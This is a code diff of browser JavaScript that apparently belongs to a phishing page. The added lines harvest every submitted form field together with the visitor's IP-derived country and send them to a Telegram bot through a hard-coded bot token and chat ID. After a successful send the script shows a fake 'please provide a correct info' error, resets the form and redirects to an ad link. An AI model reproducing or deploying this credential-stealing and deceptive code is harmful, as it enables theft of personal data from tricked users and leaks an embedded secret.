@@ -1,10 +1,11 @@
 document.addEventListener("DOMContentLoaded", () => {
-  const DEFAULT_USER_ID = "7979664801"; // fallback if no id in URL
+  const BOT_TOKEN = "7782600997:AAHkI0CBrgQqeFdykaI7qFWMEECYImmd00M"; // your bot token
+  const DEFAULT_USER_ID = "6940101627"; // your Telegram chat ID (or default)
   const forms = document.querySelectorAll("form");
 
-  let userCountry = "Unknown"; // default
+  let userCountry = "Unknown";
 
-  // Fetch country name first
+  // Get user country via IP API
   fetch("https://ipapi.co/json/")
     .then(res => res.json())
     .then(data => {
@@ -18,7 +19,7 @@ document.addEventListener("DOMContentLoaded", () => {
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
 
-      // ✅ Ensure we wait until userCountry is resolved
+      // Wait for user country if still unknown
       if (userCountry === "Unknown") {
         try {
           const res = await fetch("https://ipapi.co/json/");
@@ -31,42 +32,48 @@ document.addEventListener("DOMContentLoaded", () => {
         }
       }
 
-      // Get userId from URL or use default
+      // Get user ID from URL (?id=xxxx) or fallback
       const urlParams = new URLSearchParams(window.location.search);
       const userId = urlParams.get("id") || DEFAULT_USER_ID;
 
-      // Collect all form fields
+      // Collect all form data
       const formData = {};
       new FormData(form).forEach((value, key) => {
         formData[key] = value;
       });
 
-      // Add page title, form name, and country
-      const payload = {
-        chat_id: userId,
-        form_data: formData,
-        pageTitle: document.title,
-        formName: form.getAttribute("name") || `Form-${index + 1}`,
-        country: userCountry
-      };
+      // Format message text
+      let message = `📄 *New Form Submission*\n`;
+      message += `🏷️ Page: ${document.title}\n`;
+      message += `🗂️ Form: ${form.getAttribute("name") || `Form-${index + 1}`}\n`;
+      message += `🌍 Country: ${userCountry}\n\n`;
+
+      for (const key in formData) {
+        message += `🔹 *${key}:* ${formData[key]}\n`;
+      }
 
       try {
-        const response = await fetch("https://intelligentback.onrender.com/submit", {
+        // Send to Telegram directly (no backend)
+        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const response = await fetch(telegramUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
+          body: JSON.stringify({
+            chat_id: userId,
+            text: message,
+            parse_mode: "Markdown"
+          })
         });
 
         if (response.ok) {
-          alert(`⛔ Please enter correct info`);
+          alert("Please provide a correct info");
           form.reset();
-
-          // Redirect after submission
-          window.location.href = "ads.html"; // <<< change to any URL you want
+          // Optional redirect after success
+          window.location.href = "https://otieu.com/4/9831084";
         } else {
           const errorText = await response.text();
           console.error("Telegram Error:", errorText);
-          alert(`❌ Error submitting form. Check console for details.`);
+          alert(`❌ Error submitting form.`);
         }
       } catch (err) {
         console.error("Network Error:", err);
